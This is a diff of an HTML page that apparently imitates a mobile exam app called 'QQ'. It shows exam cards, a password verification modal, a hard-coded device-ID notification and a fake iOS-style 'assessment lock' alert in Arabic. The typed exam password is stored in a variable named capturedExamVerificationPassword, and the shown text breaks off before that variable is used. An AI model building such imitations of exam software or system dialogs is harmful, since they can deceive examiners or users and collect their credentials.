@@ -5,6 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Integrated Exam System</title>
 
+    <link rel="icon" type="image/png" href="QQ.png">
+    <link rel="apple-touch-icon" href="QQ.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="QQ.png">
+    <link rel="apple-touch-icon" sizes="167x167" href="QQ.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="QQ.png">
+    
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="Exam System">
+    
     <style>
         /* =========================================
            1. التنسيقات العامة ولوحة التحكم (Dashboard)
@@ -25,7 +35,7 @@
         }
 
         #dashboard-container { display: block; }
-        #exam-start-page { display: none; height: 100vh; flex-direction: column; }
+        #exam-start-page { display: none; flex-direction: column; overflow: hidden; }
         #exam-interface-container { display: none; height: 100vh; background: #222; padding: 0; overflow: hidden; }
         #uploading-screen-container { display: none; min-height: 100vh; background: #1c1c1e; position: relative; } 
         #post-exam-dashboard { display: none; }
@@ -223,7 +233,13 @@
             display: flex;
             justify-content: space-between;
             align-items: flex-start; 
-            padding-bottom: 16px; 
+            padding-bottom: 0px; 
+            margin-bottom: 0px; 
+            cursor: pointer;
+        }
+
+        .exam-card.expanded .exam-header {
+            padding-bottom: 16px;
             border-bottom: 1px solid #3a3a3c; 
             margin-bottom: 18px; 
         }
@@ -241,12 +257,31 @@
             color: #aeaeb2;
             text-align: right;
             line-height: 1.4;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .arrow-toggle {
+            font-size: 14px;
+            color: #7c7c80;
+            cursor: pointer;
+            user-select: none;
+            transition: transform 0.2s;
+            padding: 4px;
+        }
+
+        .exam-details.collapsed, 
+        .view-score.collapsed,
+        .btn-attempt-custom.collapsed { 
+            display: none !important; 
         }
 
         .exam-details {
             display: grid;
-            grid-template-columns: 1fr 1fr;
+            grid-template-columns: auto 1fr;
             row-gap: 16px;
+            column-gap: 12px;
             font-size: 14px;
             color: #aeaeb2; 
         }
@@ -255,6 +290,7 @@
             color: #ffffff; 
             justify-self: end;
             font-weight: 500;
+            white-space: nowrap;
         }
 
         .exam-details .value.status-Available {
@@ -281,6 +317,23 @@
 
         .view-score:active {
             background: rgba(42, 101, 191, 0.05); 
+        }
+
+        .btn-attempt-custom {
+            margin-top: 22px;
+            width: 100%;
+            padding: 13px; 
+            background: #2a65bf; 
+            border: none; 
+            border-radius: 10px;
+            color: #ffffff; 
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .btn-attempt-custom:active {
+            background: #1e4b8f; 
         }
 
         .hidden { display: none !important; }
@@ -311,39 +364,111 @@
             top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0.65);
             display: flex; justify-content: center; align-items: center;
-            z-index: 2000; padding: 24px; 
+            z-index: 5000; padding: 24px; 
         }
 
         .modal-box {
             background: #2a2a2e; 
             border: 1px solid #3a3a3f;
-            border-radius: 12px; 
-            width: 100%; max-width: 320px;
-            padding: 38px 16px 16px;
+            border-radius: 4px; 
+            width: 100%; max-width: 400px;
+            padding: 0;
             text-align: center; position: relative;
             box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            overflow: hidden;
         }
 
-        .modal-icon {
-            position: absolute; top: -28px; left: 50%; transform: translateX(-50%);
-            width: 56px; height: 56px; background: #2a65bf; 
-            border-radius: 50%; border: 3px solid #2a2a2e; outline: 2px solid #ffffff; 
+        .modal-header-custom {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #2a65bf;
+            padding: 10px 15px;
+            color: white;
+            font-weight: bold;
+            font-size: 15px;
+        }
+
+        .modal-close-custom {
+            background: #ef4444;
+            color: white;
+            border: none;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 2px;
+        }
+
+        .modal-body-custom {
+            padding: 20px;
+            background-color: #2c2c2e;
+        }
+
+        .modal-input-custom {
+            width: 100%;
+            padding: 12px;
+            background: #1c1c1e;
+            border: 1px solid #48484a;
+            border-radius: 4px;
+            color: white;
+            font-size: 15px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+
+        .modal-input-custom::placeholder {
+            color: #8e8e93;
+        }
+
+        .modal-verify-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #22c55e;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .modal-icon { display: none; }
+        .modal-title { display: none; }
+        .modal-text { display: none; }
+        .modal-input-group { display: none; }
+        .modal-btn-container { display: none; }
+
+        /* ===== Notification Modal (New Style - IMG_2794.PNG) ===== */
+        .notif-box {
+            background: #2a2a2e; 
+            border: 1px solid #3a3a3f;
+            border-radius: 8px; 
+            width: 100%; max-width: 340px;
+            padding: 48px 20px 20px;
+            text-align: center; position: relative;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.6);
+        }
+
+        .notif-badge {
+            position: absolute; top: -32px; left: 50%; transform: translateX(-50%);
+            width: 64px; height: 64px; background: #2a65bf; 
+            border-radius: 50%; border: 3px solid #ffffff; outline: 1.5px solid #2a2a2e;
             display: flex; justify-content: center; align-items: center;
-            font-size: 26px; font-weight: bold; color: white;
+            font-size: 30px; font-weight: bold; color: white;
+            z-index: 10;
         }
 
-        .modal-title { font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 14px; }
-        .modal-text { font-size: 13.5px; color: #e0e0e3; line-height: 1.6; margin-bottom: 20px; text-align: center; }
-        .modal-input-group { margin-bottom: 20px; text-align: left; }
-        .modal-input-group label { display: block; color: #aeaeb2; font-size: 13px; margin-bottom: 8px; }
-        .modal-input-group input {
-            width: 100%; padding: 12px; background: #1c1c1e; border: 1px solid #3a3a3c;
-            border-radius: 8px; color: white; font-size: 16px; outline: none;
+        .notif-title { font-size: 19px; font-weight: bold; color: #ffffff; margin-bottom: 18px; }
+        .notif-text { font-size: 16px; color: #ffffff; line-height: 1.6; margin-bottom: 25px; font-weight: 500; }
+        .notif-ok-btn { 
+            width: 100%; padding: 13px; background: #2a65bf; color: white; 
+            border: none; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; 
         }
-
-        .modal-btn-container { display: flex; gap: 10px; }
-        .modal-btn { width: 100%; padding: 11px; background: #2a65bf; color: white; border: none; border-radius: 6px; font-size: 15px; cursor: pointer; font-weight: 500; }
-        .modal-btn.btn-secondary { background: #3a3a3c; color: #ffffff; }
 
         /* ===== Bottom Sheets ===== */
         .bottom-sheet-overlay {
@@ -382,15 +507,72 @@
         .profile-info-text .name-lbl { color: #ffffff; font-size: 16px; font-weight: bold; }
         .signout-btn { width: 100%; padding: 13px; background: transparent; border: 1px solid #c93b3b; border-radius: 10px; color: #e54343; font-weight: 600; cursor: pointer; }
 
+        /* ===== iOS Alert View Style ===== */
+        .ios-alert-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: transparent; z-index: 6000;
+            display: none; justify-content: center; align-items: center;
+        }
+        .ios-alert-box {
+            width: 270px; background: rgba(37, 37, 37, 0.9);
+            border-radius: 14px; overflow: hidden; text-align: center;
+            color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .ios-alert-content { padding: 18px 16px; }
+        .ios-alert-title { font-size: 17px; font-weight: 600; margin-bottom: 4px; line-height: 1.3; }
+        .ios-alert-message { font-size: 13px; line-height: 1.4; font-weight: 400; }
+        .ios-alert-buttons { display: flex; border-top: 0.5px solid rgba(255, 255, 255, 0.2); }
+        .ios-alert-btn {
+            flex: 1; padding: 12px; font-size: 17px; cursor: pointer;
+            background: transparent; border: none; color: #0a84ff;
+            outline: none; -webkit-tap-highlight-color: transparent;
+        }
+        .ios-alert-btn:active { background: rgba(255, 255, 255, 0.1); }
+        .ios-alert-btn.cancel { border-right: 0.5px solid rgba(255, 255, 255, 0.2); }
+        .ios-alert-btn.confirm { font-weight: 600; }
+
         /* ===== Instructions Page ===== */
         .page-header { padding: 15px; display: flex; align-items: center; background-color: #2c2c2e; border-bottom: 1px solid #3a3a3c; }
         .back-arrow { font-size: 24px; margin-right: 15px; cursor: pointer; color: #ffffff; }
-        .detail-list { padding: 20px; flex-grow: 1; }
-        .detail-item { display: flex; flex-direction: column; margin-bottom: 20px; }
-        .detail-item .dt-label { color: #aeaeb2; font-size: 13px; margin-bottom: 5px; }
-        .detail-item .dt-value { font-size: 16px; color: #ffffff; font-weight: 500; }
-        .instructions-box { background-color: #2c2c2e; padding: 20px; border-radius: 8px; border: 1px solid #3a3a3c; height: 150px; color: #aeaeb2; font-size: 14px; margin-top: 8px; }
-        .footer-action { padding: 20px; background-color: #1c1c1e; }
+        .detail-list { padding: 20px; overflow-y: auto; }
+        
+        .detail-item { 
+            display: flex; 
+            align-items: center; 
+            gap: 16px; 
+            margin-bottom: 20px; 
+            padding-bottom: 15px; 
+            border-bottom: 1px solid #2d2d30; 
+        }
+        
+        .detail-item:last-of-type { border-bottom: none; }
+
+        .detail-icon-box {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .detail-icon-box svg {
+            width: 20px;
+            height: 20px;
+            stroke: #aeaeb2;
+            fill: none;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .detail-info-box { display: flex; flex-direction: column; gap: 4px; }
+        .detail-info-box .dt-label { color: #aeaeb2; font-size: 13px; font-weight: 500; }
+        .detail-info-box .dt-value { font-size: 15px; color: #ffffff; font-weight: bold; }
+
+        .instructions-box { background-color: #2c2c2e; padding: 20px; border-radius: 8px; border: 1px solid #3a3a3c; height: 120px; color: #aeaeb2; font-size: 14px; margin-top: 12px; }
+        .footer-action { padding: 20px; background-color: #1c1c1e; position: absolute; bottom: 0; width: 100%; }
 
         @media (min-width: 1024px) { .content { max-width: 900px; } }
 
@@ -449,6 +631,9 @@
             padding: 6px 14px;
             flex-shrink: 0;
             width: 100%;
+            display: flex;
+            align-items: center;
+            gap: 12px;
         }
 
         .timer {
@@ -457,6 +642,27 @@
             font-weight: 600;
             letter-spacing: 0.5px;
             text-align: left;
+        }
+
+        .timer-icon-btn {
+            width: 34px;
+            height: 34px;
+            background: #0d1624;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: default;
+        }
+
+        .timer-icon-svg {
+            width: 20px;
+            height: 20px;
+            stroke: #ffffff;
+            stroke-width: 2.2;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
         }
 
         .header {
@@ -602,6 +808,7 @@
         .sidebar-q-btn.answered { background: #22c55e !important; color: #fff; }
         .sidebar-q-btn.unanswered { background: #3b82f6; }
         .sidebar-q-btn.flagged { background: #f59e0b !important; color: #fff !important; }
+        .sidebar-q-btn.skipped { background: #ef4444 !important; color: #fff !important; }
 
         .sidebar-arrow-indicator {
     content: '';
@@ -624,6 +831,9 @@
 
 /* سهم السؤال الحالي إذا تم حلّه (أخضر) - السطر الجديد */
 .sidebar-q-container.active-q .sidebar-q-btn.answered + .sidebar-arrow-indicator { border-left-color: #22c55e !important; }
+
+/* سهم السؤال الحالي إذا تم تخطيه (أحمر) */
+.sidebar-q-container.active-q .sidebar-q-btn.skipped + .sidebar-arrow-indicator { border-left-color: #ef4444 !important; }
         
 
         .question-area {
@@ -717,12 +927,12 @@
             border-top: 1px solid var(--footer-border);
         }
 
-        .btn-footer { border-radius: 6px; padding: 8px 24px; font-weight: 600; font-size: 13px; cursor: pointer; text-align: center; white-space: nowrap; }
+        .btn-footer { border-radius: 6px; padding: 8px 24px; font-weight: 600; font-size: 13px; cursor: pointer; text-align: center; white-space: nowrap; color: #ffffff !important; }
 
-        .btn-prev { background: transparent; border: 1.5px solid #2d3139; color: #4b5261; }
-        .btn-prev.active-btn { border-color: var(--text-primary); color: var(--text-primary); }
-        .btn-flag { background: transparent; border: 1.5px solid var(--text-primary); color: var(--text-primary); }
-        .btn-next { background: #3b82f6; border: none; color: #fff; padding: 8px 32px; }
+        .btn-prev { background: transparent; border: 1.5px solid #2d3139; min-width: 100px; }
+        .btn-prev.active-btn { border-color: #ffffff; }
+        .btn-flag { background: transparent; border: 1.5px solid #ffffff; min-width: 100px; }
+        .btn-next { background: #3b82f6; border: none; padding: 8px 32px; min-width: 120px; }
 
         /* =========================================
            4. شاشة ملخص الإجابات المحفوظة (Summary Sheet Modal)
@@ -754,6 +964,7 @@
         .box-not-attempted { background: #3b82f6; }
         .box-attempted { background: #22c55e; }
         .box-flagged { background: #f59e0b; }
+        .box-skipped { background: #ef4444; }
 
         .summary-divider { height: 1px; background: var(--option-border); margin: 10px 0 20px; }
         .items-title-red { color: #ef4444; font-size: 15px; font-weight: 700; margin-bottom: 14px; }
@@ -764,6 +975,7 @@
         .summary-item-block.status-answered { background: #82cc6c; } 
         .summary-item-block.status-not-attempted { background: #3b82f6; }
         .summary-item-block.status-flagged { background: #f59e0b; }
+        .summary-item-block.status-skipped { background: #ef4444; }
 
         .summary-footer { margin-top: auto; display: flex; justify-content: center; padding: 20px 0 14px; flex-shrink: 0; }
         .btn-summary-end { background: #ef4444; border: none; color: #ffffff; padding: 12px 0; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; width: 45%; text-align: center; box-shadow: 0 4px 10px rgba(239, 68, 68, 0.25); }
@@ -867,19 +1079,24 @@
         </div>
 
         <div id="exams-container">
-            <div class="exam-card">
+            <div class="exam-card" onclick="toggleExamCard(this)">
                 <div class="exam-header">
-                    <div class="exam-title">final_NUR220_2nd_2026</div>
-                    <div class="exam-date">08 Jun 2026<br>08:00 AM</div>
+                    <div class="exam-title">Final Exam</div>
+                    <div class="exam-date">
+                        <div>
+                            <span style="color: #ffffff;">10 Jun 2026</span><br>8:00 AM
+                        </div>
+                        <span class="arrow-toggle">▼</span>
+                    </div>
                 </div>
-                <div class="exam-details">
-                    <span>Course</span> <span class="value">Professional Communications</span>
+                <div class="exam-details collapsed">
+                    <span>Course</span> <span class="value">Principles of Education for Nursing Practice</span>
                     <span>Duration</span> <span class="value">02:00:00</span>
                     <span>Proctored</span> <span class="value">No</span>
                     <span>Status</span> <span class="value status-Available">Available</span>
                     <span>Upload Status</span> <span class="value">-</span>
                 </div>
-                <button class="view-score" onclick="goToExamPage()">Attempt (Take Exam)</button>
+                <button class="btn-attempt-custom collapsed" onclick="event.stopPropagation(); goToExamPage()">Attempt (Take Exam)</button>
             </div>
         </div>
         
@@ -891,14 +1108,59 @@
     <div id="exam-start-page">
         <div class="page-header">
             <span class="back-arrow" onclick="goBackToDashboard()">&#8592;</span>
-            <span style="font-weight: bold; color: white;">final_NUR220_2nd_2026</span>
+            <span style="font-weight: bold; color: white;">Final Exam</span>
         </div>
         <div class="detail-list">
-            <div class="detail-item"><span>Course</span><span class="dt-value">Professional Communications</span></div>
-            <div class="detail-item"><span>Total Duration</span><span class="dt-value">02:00:00</span></div>
-            <div class="detail-item"><span>Remaining Duration</span><span class="dt-value" id="timer-display" style="color: #2a65bf;">02:00:00</span></div>
-            <div class="detail-item"><span>Language</span><span class="dt-value">English</span></div>
-            <div class="detail-item"><span>Proctored</span><span class="dt-value">No</span></div>
+            <div class="detail-item">
+                <div class="detail-icon-box">
+                    <svg viewBox="0 0 24 24"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path></svg>
+                </div>
+                <div class="detail-info-box">
+                    <span class="dt-label">Course</span>
+                    <span class="dt-value">Principles of Education for Nursing Practice</span>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="detail-icon-box">
+                    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+                </div>
+                <div class="detail-info-box">
+                    <span class="dt-label">Total Duration</span>
+                    <span class="dt-value">02:00:00</span>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="detail-icon-box">
+                    <svg viewBox="0 0 24 24"><circle cx="12" cy="13" r="8"></circle><path d="M12 9v4l2 2"></path><path d="M5 3 2 6"></path><path d="M22 6 19 3"></path></svg>
+                </div>
+                <div class="detail-info-box">
+                    <span class="dt-label">Remaining Duration</span>
+                    <span class="dt-value" id="timer-display" style="color: #2a65bf;">02:00:00</span>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="detail-icon-box">
+                    <svg viewBox="0 0 24 24"><path d="m5 8 6 6"></path><path d="m4 14 6-6 2-3"></path><path d="M2 5h12"></path><path d="M7 2h1"></path><path d="m22 22-5-10-5 10"></path><path d="M14 18h6"></path></svg>
+                </div>
+                <div class="detail-info-box">
+                    <span class="dt-label">Language</span>
+                    <span class="dt-value">English</span>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="detail-icon-box">
+                    <svg viewBox="0 0 24 24"><path d="M8 3H5a2 2 0 0 0-2 2v3"></path><path d="M21 8V5a2 2 0 0 0-2-2h-3"></path><path d="M3 16v3a2 2 0 0 0 2 2h3"></path><path d="M16 21h3a2 2 0 0 0 2-2v-3"></path><path d="M7 14s1-1 5-1 5 1 5 1"></path><circle cx="12" cy="9" r="3"></circle></svg>
+                </div>
+                <div class="detail-info-box">
+                    <span class="dt-label">Proctored</span>
+                    <span class="dt-value">No</span>
+                </div>
+            </div>
+
             <div style="margin-top: 20px;">
                 <span style="font-weight: bold; font-size: 14px; color: white;">Instructions</span>
                 <div class="instructions-box">No Instructions Available.</div>
@@ -943,6 +1205,10 @@
                         <span>Flagged</span>
                         <div class="filter-color-box box-flagged"></div>
                     </div>
+                    <div class="filter-item">
+                        <span>Skipped</span>
+                        <div class="filter-color-box box-skipped"></div>
+                    </div>
                 </div>
 
                 <div class="summary-divider"></div>
@@ -958,6 +1224,13 @@
 
         <div class="timer-bar">
             <div class="timer" id="countdownTimerText">02:00:00</div>
+            <div class="timer-icon-btn">
+                <svg class="timer-icon-svg" viewBox="0 0 24 24">
+                    <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"></path>
+                    <path d="M3 3v5h5"></path>
+                    <path d="M12 7v5l4 2"></path>
+                </svg>
+            </div>
         </div>
         
         <div class="header">
@@ -1041,6 +1314,7 @@
         <div class="footer">
             <button type="button" class="btn-footer btn-prev" id="examPrevBtn">Previous</button>
             <button type="button" class="btn-footer btn-flag" id="examFlagBtn">Flag</button>
+            <button type="button" class="btn-footer btn-flag" id="examSkipBtn" style="margin-left: 10px;">Skip</button>
             <button type="button" class="btn-footer btn-next" id="examNextBtn">Next</button>
         </div>
     </div>
@@ -1104,6 +1378,18 @@
             </svg>
             <svg class="icon-svg" viewBox="0 0 24 24">
                 <circle cx="11" cy="11" r="8"></circle>
+                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+            </svg>
+            <svg class="icon-svg" viewBox="0 0 24 24" style="fill: none; stroke: #ffffff; stroke-width: 2.5;" onclick="openFilter()">
+                <line x1="2" y1="8" x2="22" y2="8"></line>
+                <circle cx="9" cy="8" r="2.5" style="fill: #ffffff; stroke: none;"></circle>
+                <line x1="2" y1="16" x2="22" y2="16"></line>
+                <circle cx="15" cy="16" r="2.5" style="fill: #ffffff; stroke: none;"></circle>
+            </svg>
+            <svg class="icon-svg" viewBox="0 0 24 24" onclick="openNotificationModal()">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="12" y1="16" x2="12" y2="12"></line>
+                <line x1="12" y1="8" x2="12.01" y2="8"></line>
             </svg>
         </div>
     </div>
@@ -1123,19 +1409,24 @@
         </div>
 
         <div id="post-exams-container">
-            <div class="exam-card">
+            <div class="exam-card" onclick="toggleExamCard(this)">
                 <div class="exam-header">
-                    <div class="exam-title">final_NUR220_2nd_2026</div>
-                    <div class="exam-date">08 Jun 2026<br>08:00 AM</div>
+                    <div class="exam-title">Final Exam</div>
+                    <div class="exam-date">
+                        <div>
+                            <span style="color: #ffffff;">10 Jun 2026</span><br>8:00 AM
+                        </div>
+                        <span class="arrow-toggle">▼</span>
+                    </div>
                 </div>
-                <div class="exam-details">
-                    <span>Course</span> <span class="value">Professional Communications</span>
+                <div class="exam-details collapsed">
+                    <span>Course</span> <span class="value">Principles of Education for Nursing Practice</span>
                     <span>Duration</span> <span class="value">02:00:00</span>
                     <span>Proctored</span> <span class="value">No</span>
                     <span>Status</span> <span class="value status-ended">Exam Ended</span>
                     <span>Upload Status</span> <span class="value">Uploaded</span>
                 </div>
-                <button class="view-score" onclick="openResultsNotificationModal()">View Score</button>
+                <button class="view-score collapsed" onclick="event.stopPropagation(); openResultsNotificationModal()">View Score</button>
             </div>
         </div>
         
@@ -1145,19 +1436,36 @@
     </div>
 </div>
 
+<div id="confirm-modal-overlay" class="modal-overlay hidden">
+    <div class="notif-box">
+        <div class="notif-badge">i</div>
+        <div class="notif-title">Notification</div>
+        <div class="notif-text">Are you sure you want to finish exam?</div>
+        <div class="confirm-btn-container">
+            <button class="notif-ok-btn" style="margin-bottom: 12px;" onclick="proceedToUpload()">Yes</button>
+            <button class="notif-ok-btn" onclick="closeConfirmModal()">No</button>
+        </div>
+    </div>
+</div>
+
+<div id="notif-modal-overlay" class="modal-overlay hidden">
+    <div class="notif-box">
+        <div class="notif-badge">i</div>
+        <div class="notif-title" id="notif-custom-title">Notification</div>
+        <div class="notif-text" id="notif-custom-text">Exam Result is not published. Once your result is published, you will receive a notification.</div>
+        <button class="notif-ok-btn" onclick="closeNotifModal()">Ok</button>
+    </div>
+</div>
+
 <div id="score-modal" class="modal-overlay hidden">
     <div class="modal-box">
-        <div class="modal-icon" id="modal-badge-icon">i</div>
-        <div class="modal-title" id="modal-title-text">Notification</div>
-        <div class="modal-text" id="modal-body-text">Exam Result is not published. Once your result is published, you will receive a notification.</div>
-        
-        <div id="modal-password-group" class="modal-input-group hidden">
-            <label>Examination Password</label>
-            <input type="password" id="exam-password-input" placeholder="********">
+        <div class="modal-header-custom">
+            <span id="modal-custom-title">Verification</span>
+            <button class="modal-close-custom" onclick="closeModal()">X</button>
         </div>
-        
-        <div class="modal-btn-container" id="modal-buttons-container">
-            <button class="modal-btn" onclick="closeModal()">Ok</button>
+        <div class="modal-body-custom" id="modal-custom-body">
+            <input type="password" id="exam-password-input" class="modal-input-custom" placeholder="Examination Password">
+            <button class="modal-verify-btn" id="modal-custom-btn" onclick="verifyAndStart()">Verify</button>
         </div>
     </div>
 </div>
@@ -1196,6 +1504,35 @@
     </div>
 </div>
 
+<div id="lock-notification-overlay" class="bottom-sheet-overlay" onclick="closeLockNotification(event)">
+    <div class="bottom-sheet" onclick="event.stopPropagation()" style="background: #1c1c1e; border-top: 1px solid #333; padding-bottom: 20px;">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding: 0 4px;">
+            <span style="font-size: 14px; font-weight: bold; color: #fff;">Notification</span>
+            <span style="color: #fff; cursor: pointer; font-size: 18px;" onclick="closeLockNotification(null)">✕</span>
+        </div>
+        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 24px; padding: 0 4px;">
+            <div style="flex-shrink: 0; color: #8e8e93;">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+            </div>
+            <span style="font-size: 14px; color: #e0e0e0; line-height: 1.4;">You will not be able to access any other application while using QQ Application</span>
+        </div>
+        <button onclick="showiOSAlert()" style="width: 100%; background: #2a65bf; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer;">Ok, Continue</button>
+    </div>
+</div>
+
+<div id="ios-alert-overlay" class="ios-alert-overlay">
+    <div class="ios-alert-box">
+        <div class="ios-alert-content">
+            <div class="ios-alert-title">تأكيد القفل الذاتي للتطبيق؟</div>
+            <div class="ios-alert-message">يرغب QQ ان يبدأ نمط التقييم. لن يكون بإمكانك استخدام تطبيقات أخرى على الـ iPhone حتى يُنتهي QQ نمط التقييم. هل ترغب في السماح بذلك؟</div>
+        </div>
+        <div class="ios-alert-buttons">
+            <button class="ios-alert-btn cancel" onclick="closeiOSAlert()">لا</button>
+            <button class="ios-alert-btn confirm" onclick="confirmiOSAlert()">نعم</button>
+        </div>
+    </div>
+</div>
+
 <script>
     let capturedExamVerificationPassword = "";
     let examSystemInitialized = false;
@@ -1208,15 +1545,49 @@
         setTimeout(() => { loading.classList.add('hidden'); }, 1000); 
     }
 
+    function toggleExamCard(card) {
+        const details = card.querySelector('.exam-details');
+        const btn = card.querySelector('.btn-attempt-custom') || card.querySelector('.view-score');
+        const arrow = card.querySelector('.arrow-toggle');
+        
+        if (card.classList.contains('expanded')) {
+            card.classList.remove('expanded');
+            details.classList.add('collapsed');
+            if (btn) btn.classList.add('collapsed');
+            if (arrow) arrow.textContent = '▼';
+        } else {
+            card.classList.add('expanded');
+            details.classList.remove('collapsed');
+            if (btn) btn.classList.remove('collapsed');
+            if (arrow) arrow.textContent = '▲';
+        }
+    }
+
     function toggleSwitch() {
         const toggleContainer = document.getElementById('toggle-container');
         const toggleText = document.getElementById('toggle-text');
+        const cards = document.querySelectorAll('#exams-container .exam-card');
+
         if (toggleContainer.classList.contains('active')) {
             toggleContainer.classList.remove('active');
             toggleText.textContent = 'Open All';
+            cards.forEach(card => {
+                card.classList.remove('expanded');
+                card.querySelector('.exam-details').classList.add('collapsed');
+                const btn = card.querySelector('.btn-attempt-custom') || card.querySelector('.view-score');
+                if (btn) btn.classList.add('collapsed');
+                card.querySelector('.arrow-toggle').textContent = '▼';
+            });
         } else {
             toggleContainer.classList.add('active');
             toggleText.textContent = 'Close All';
+            cards.forEach(card => {
+                card.classList.add('expanded');
+                card.querySelector('.exam-details').classList.remove('collapsed');
+                const btn = card.querySelector('.btn-attempt-custom') || card.querySelector('.view-score');
+                if (btn) btn.classList.remove('collapsed');
+                card.querySelector('.arrow-toggle').textContent = '▲';
+            });
         }
     }
 
@@ -1273,103 +1644,149 @@
     }
 
     function openNotificationModal() {
-        document.getElementById('modal-badge-icon').textContent = 'i';
-        document.getElementById('modal-title-text').textContent = 'Notification';
-        document.getElementById('modal-body-text').innerHTML = 'The exam portal is ready for evaluation.';
-        document.getElementById('modal-password-group').classList.add('hidden');
-        document.getElementById('modal-buttons-container').innerHTML = `<button class="modal-btn" onclick="closeModal()">Ok</button>`;
-        document.getElementById('score-modal').classList.remove('hidden');
+        document.getElementById('notif-custom-title').textContent = 'Notification';
+        document.getElementById('notif-custom-text').innerHTML = `
+            The QQ app was first launched at 02 Jun 2026 07:04:58 AM, with Device ID: 48F0A388-D0F6-4265-8E22-504A0D7714C9 and Timezone: Asia/Riyadh
+        `;
+        document.getElementById('notif-modal-overlay').classList.remove('hidden');
     }
 
     function openPasswordModal() {
-        document.getElementById('modal-badge-icon').textContent = '?';
-        document.getElementById('modal-title-text').textContent = 'Verification';
-        document.getElementById('modal-body-text').textContent = 'Please enter the examination password to proceed.';
-        document.getElementById('modal-password-group').classList.remove('hidden');
-        document.getElementById('exam-password-input').value = '';
-        document.getElementById('modal-buttons-container').innerHTML = `
-            <button class="modal-btn btn-secondary" onclick="closeModal()">Cancel</button>
-            <button class="modal-btn" onclick="verifyAndStart()">Verify</button>
+        document.getElementById('modal-custom-title').textContent = 'Verification';
+        document.getElementById('modal-custom-body').innerHTML = `
+            <input type="password" id="exam-password-input" class="modal-input-custom" placeholder="Examination Password">
+            <button class="modal-verify-btn" onclick="verifyAndStart()">Verify</button>
         `;
+        document.getElementById('exam-password-input').value = '';
         document.getElementById('score-modal').classList.remove('hidden');
     }
 
     function openResultsNotificationModal() {
-        document.getElementById('modal-badge-icon').textContent = 'i';
-        document.getElementById('modal-title-text').textContent = 'Notification';
-        document.getElementById('modal-body-text').textContent = 'Exam Result is not published. Once your result is published, you will receive a notification.';
-        document.getElementById('modal-password-group').classList.add('hidden');
-        document.getElementById('modal-buttons-container').innerHTML = `<button class="modal-btn" onclick="closeModal()">Ok</button>`;
-        document.getElementById('score-modal').classList.remove('hidden');
+        document.getElementById('notif-custom-title').textContent = 'Notification';
+        document.getElementById('notif-custom-text').textContent = 'Exam Result is not published. Once your result is published, you will receive a notification.';
+        document.getElementById('notif-modal-overlay').classList.remove('hidden');
     }
 
     function closeModal() { document.getElementById('score-modal').classList.add('hidden'); }
+    function closeNotifModal() { document.getElementById('notif-modal-overlay').classList.add('hidden'); }
     function openFilter() { document.getElementById('filter-overlay').classList.add('open'); }
     function closeFilter(event) { if (!event || event.target === document.getElementById('filter-overlay')) document.getElementById('filter-overlay').classList.remove('open'); }
     function selectFilterOption(element) { document.querySelectorAll('.filter-option').forEach(opt => opt.classList.remove('selected')); element.classList.add('selected'); }
     function openProfileSheet() { document.getElementById('profile-sheet-overlay').classList.add('open'); }
     function closeProfileSheet(event) { if (!event || event.target === document.getElementById('profile-sheet-overlay')) document.getElementById('profile-sheet-overlay').classList.remove('open'); }
 
-    function verifyAndStart() {
-        capturedExamVerificationPassword = document.getElementById('exam-password-input').value || "";
-        closeModal();
+    function openLockNotification() {
+        document.getElementById('lock-notification-overlay').classList.add('open');
+    }
+
+    function closeLockNotification(event) {
